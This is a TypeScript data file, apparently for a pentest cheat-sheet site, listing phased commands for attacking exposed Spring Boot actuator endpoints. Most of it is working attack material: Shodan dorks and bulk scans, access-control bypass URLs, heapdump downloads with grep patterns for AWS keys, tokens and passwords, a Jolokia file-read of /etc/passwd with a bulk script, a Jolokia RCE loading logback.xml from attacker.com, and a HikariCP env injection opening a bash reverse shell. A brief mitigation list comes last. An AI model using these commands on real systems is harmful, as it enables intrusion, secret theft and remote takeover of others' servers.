export interface SpringBootCategory {
  category: string
  commands: { command: string; description: string }[]
}

export const springBootCategories: SpringBootCategory[] = [
  {
    category: "Phase 1: Discovery - Shodan Dorks",
    commands: [
      { command: 'org:target_org http.favicon.hash:116323821', description: "Shodan dork - find Spring Boot by favicon hash" },
      { command: 'ssl:"example.com" http.favicon.hash:116323821', description: "Shodan dork - SSL certificate + favicon" },
      { command: 'ssl.cert.subject.CN:"*.example.com" http.favicon.hash:116323821', description: "Shodan dork - wildcard cert + favicon" },
      { command: 'hostname:"example.com" http.favicon.hash:116323821', description: "Shodan dork - hostname + favicon" },
      { command: 'ssl.cert.subject.CN:"example.com" http.favicon.hash:116323821', description: "Shodan dork - exact cert + favicon" },
    ],
  },
  {
    category: "Phase 1: Discovery - Nuclei Scanner",
    commands: [
      { command: "cat act.txt | nuclei -tags actuator -c 50", description: "Nuclei scan - actuator templates" },
      { command: "cat act.txt | nuclei -tags jolokia -es info,low -silent", description: "Nuclei scan - jolokia templates" },
    ],
  },
  {
    category: "Phase 1: Discovery - Dirsearch",
    commands: [
      { command: "dirsearch -l target.txt -w /Seclist/Discovery/Web-Content/spring-boot.txt -x 404 -o output.txt", description: "Dirsearch with Spring Boot wordlist" },
    ],
  },
  {
    category: "Phase 1: Discovery - Httpx Probe",
    commands: [
      { command: "cat targets.txt | httpx-toolkit -silent -threads 50 -path '/actuator,/actuator/health,/actuator/info' -mc 200,401,403,302 > actuators.txt", description: "Httpx probe for common actuator paths" },
    ],
  },
  {
    category: "Phase 2: Key Actuator Endpoints",
    commands: [
      { command: "http://ipaddr/actuator", description: "Actuator root - base endpoint" },
      { command: "http://ipaddr/actuator/health", description: "Health - application health status" },
      { command: "http://ipaddr/actuator/info", description: "Info - application info" },
      { command: "http://ipaddr/actuator/env", description: "ENV - environment variables (HIGH RISK)" },
      { command: "http://ipaddr/actuator/configprops", description: "Configprops - configuration properties" },
      { command: "http://ipaddr/actuator/beans", description: "Beans - Spring beans list" },
      { command: "http://ipaddr/actuator/mappings", description: "Mappings - request mappings" },
      { command: "http://ipaddr/actuator/metrics", description: "Metrics - application metrics" },
      { command: "http://ipaddr/actuator/loggers", description: "Loggers - logging configuration" },
      { command: "http://ipaddr/actuator/threaddump", description: "Threaddump - thread dump" },
      { command: "http://ipaddr/actuator/heapdump", description: "Heapdump - memory dump (CRITICAL)" },
      { command: "http://ipaddr/actuator/jolokia", description: "Jolokia - JMX bridge (CRITICAL)" },
      { command: "http://ipaddr/actuator/hawtio", description: "Hawtio - management console" },
      { command: "http://ipaddr/actuator/httptrace", description: "Httptrace - HTTP request trace (HIGH RISK)" },
      { command: "http://ipaddr/actuator/auditevents", description: "Auditevents - audit events" },
      { command: "http://ipaddr/actuator/scheduledtasks", description: "Scheduledtasks - scheduled tasks" },
      { command: "http://ipaddr/actuator/caches", description: "Caches - cache management" },
      { command: "http://ipaddr/actuator/sessions", description: "Sessions - HTTP sessions" },
      { command: "http://ipaddr/actuator/shutdown", description: "Shutdown - graceful shutdown" },
      { command: "http://ipaddr/actuator/prometheus", description: "Prometheus - metrics endpoint" },
      { command: "http://ipaddr/actuator/trace", description: "Trace - request trace (legacy)" },
      { command: "http://ipaddr/actuator/conditions", description: "Conditions - auto-configuration report" },
      { command: "http://ipaddr/actuator/refresh", description: "Refresh - refresh application context" },
      { command: "http://ipaddr/actuator/restart", description: "Restart - restart application" },
      { command: "http://ipaddr/actuator/env/{property}", description: "ENV property - specific env variable" },
    ],
  },
  {
    category: "Phase 2: Bypass - X-Forwarded-For",
    commands: [
      { command: "curl -H \"X-Forwarded-For: 127.0.0.1\" http://example.com/actuator/env", description: "Bypass with X-Forwarded-For header" },
    ],
  },
  {
    category: "Phase 2: Bypass - X-Original-URL",
    commands: [
      { command: "curl -H \"X-Original-URL: /actuator/env\" http://example.com/some-allowed-path", description: "Bypass with X-Original-URL header" },
    ],
  },
  {
    category: "Phase 2: Bypass - Semicolon / Matrix Tricks",
    commands: [
      { command: "http://example.com/;actuator", description: "Semicolon path injection" },
      { command: "http://example.com/actuator//env", description: "Double slash bypass" },
      { command: "http://example.com/actuator/.", description: "Dot suffix bypass" },
    ],
  },
  {
    category: "Phase 2: Bypass - Dot-Segment Traversal",
    commands: [
      { command: "http://example.com/./actuator", description: "Dot-segment prefix" },
      { command: "http://example.com/../actuator", description: "Traversal prefix" },
    ],
  },
  {
    category: "Phase 2: Bypass - URL Encoding",
    commands: [
      { command: "http://example.com/%2e%2e/actuator", description: "Percent-encoded traversal" },
      { command: "http://example.com/actuator%2Fenv", description: "Encoded slash in path" },
      { command: "http://example.com/actuator%00", description: "Null byte injection" },
    ],
  },
  {
    category: "Phase 2: Bypass - Trailing Dots & Extensions",
    commands: [
      { command: "http://example.com/actuator.", description: "Trailing dot" },
      { command: "http://example.com/actuator..", description: "Double trailing dot" },
      { command: "http://example.com/actuator.json", description: "JSON extension" },
      { command: "http://example.com/actuator.html", description: "HTML extension" },
    ],
  },
  {
    category: "Phase 2: Bypass - Query/Path Mix",
    commands: [
      { command: "http://example.com/actuator?path=env", description: "Query parameter bypass" },
      { command: "http://example.com/actuator/env?some=param", description: "Query param on actuator path" },
      { command: "http://example.com/actuator%3Fenv", description: "Encoded question mark bypass" },
    ],
  },
  {
    category: "Phase 2: Bypass - HTTP Verb & Headers",
    commands: [
      { command: "curl -X HEAD http://example.com/actuator/env", description: "HEAD verb bypass" },
      { command: "curl -X OPTIONS http://example.com/actuator/env", description: "OPTIONS verb bypass" },
      { command: "curl -H \"X-Original-URL: /actuator/env\" http://example.com/", description: "X-Original-URL header" },
      { command: "curl -H \"X-Rewrite-URL: /actuator/env\" http://example.com/", description: "X-Rewrite-URL header" },
    ],
  },
  {
    category: "Phase 3: Heapdump - AWS Key Extraction",
    commands: [
      { command: "wget http://target.com/actuator/heapdump", description: "Download heapdump" },
      { command: "strings heapdump | grep -B 2 -A 2 \"AKIA\"", description: "Extract AWS Access Keys from heapdump" },
      { command: "strings -a -n 6 heapdump | grep -Eo 'AKIA[0-9A-Z]{16}' | sort -u > aws_keys.txt", description: "Extract all AWS Key IDs" },
    ],
  },
  {
    category: "Phase 3: Heapdump - Token Extraction",
    commands: [
      { command: "strings -a -n 10 heapdump | grep -Eo '[A-Za-z0-9\\-_]+\\.[A-Za-z0-9\\-_]+\\.[A-Za-z0-9\\-_]+' | sort -u > jwt_candidates.txt", description: "Extract JWT tokens from heapdump" },
      { command: "strings -a -n 10 heapdump | grep -Eo '[A-Za-z0-9_\\-]{20,}' | sort -u > long_token_candidates.txt", description: "Extract long alphanumeric tokens (API keys)" },
      { command: "strings -a -n 6 heapdump.hprof | grep -Ei 'password|passwd|pwd|secret|api[_-]?key|token|auth|authorization|bearer|aws|AKIA|ssh-rsa' -n > possible_secrets.txt", description: "Extract all possible secrets from heapdump" },
    ],
  },
  {
    category: "Phase 3: Jolokia - Local File Inclusion (LFI)",
    commands: [
      { command: "curl \"http://domain.com/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd\"", description: "Jolokia LFI - read /etc/passwd" },
    ],
  },
  {
    category: "Phase 3: Jolokia - LFI Bash Script",
    commands: [
      { command: "while read ip; do response=$(curl -s -m 10 \"http://$ip/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd\"); if echo \"$response\" | grep -q \"root:\"; then echo \"VULNERABLE: $ip\"; echo \"$response\" > \"vulnerable_$ip.txt\"; fi; done < ip_list.txt", description: "Bulk LFI check script" },
    ],
  },
  {
    category: "Phase 3: Jolokia - RCE via logback",
    commands: [
      { command: "curl \"http://domain.com/actuator/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/attacker.com!/logback.xml\"", description: "Jolokia RCE - load malicious logback.xml" },
    ],
  },
  {
    category: "Phase 3: Jolokia - Reverse Shell via HikariCP",
    commands: [
      { command: "curl -X POST \"http://ip/actuator/env\" -H \"Content-Type: application/json\" -d '{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS '\\''String shellexec(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(new String[]{\\\"/bin/sh\\\", \\\"-c\\\", cmd}); return \\\"done\\\"; }'\\''; CALL EXEC('\\''bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'\\'');\"}'", description: "HikariCP env injection - reverse shell" },
    ],
  },
  {
    category: "Automation Tools",
    commands: [
      { command: "https://github.com/xiaoliangli1128/SpringBootFinder", description: "SpringBootFinder - discover Spring Boot instances" },
      { command: "https://github.com/onurgule/S4S-Scanner", description: "S4S-Scanner - Spring Boot security scanner" },
    ],
  },
  {
    category: "Mitigation & Prevention",
    commands: [
      { command: "Never expose actuators to public internet", description: "Mitigation #1 - firewall + internal network only" },
      { command: "Use Spring Security with authentication/authorization", description: "Mitigation #2 - protect all actuator endpoints" },
      { command: "Change base path: management.endpoints.web.base-path=/custom-secret-path", description: "Mitigation #3 - non-default path" },
      { command: "Disable unused endpoints (heapdump, jolokia in production)", description: "Mitigation #4 - disable sensitive endpoints" },
    ],
  },
]

export const springBootTools = [
  {
    name: "SpringBootFinder",
    url: "https://github.com/xiaoliangli1128/SpringBootFinder",
    description: "Discover Spring Boot instances on the internet",
  },
  {
    name: "S4S-Scanner",
    url: "https://github.com/onurgule/S4S-Scanner",
    description: "Spring Boot security scanner",
  },
  {
    name: "Nuclei Actuator Templates",
    url: "https://github.com/projectdiscovery/nuclei-templates",
    description: "Nuclei templates for actuator detection",
  },
  {
    name: "Dirsearch",
    url: "https://github.com/maurosoria/dirsearch",
    description: "Web content discovery with custom wordlists",
  },
  {
    name: "Httpx-toolkit",
    url: "https://github.com/projectdiscovery/httpx",
    description: "Multi-purpose HTTP toolkit for probing endpoints",
  },
  {
    name: "Shodan",
    url: "https://www.shodan.io",
    description: "Internet scanning engine for exposed services",
  },
]
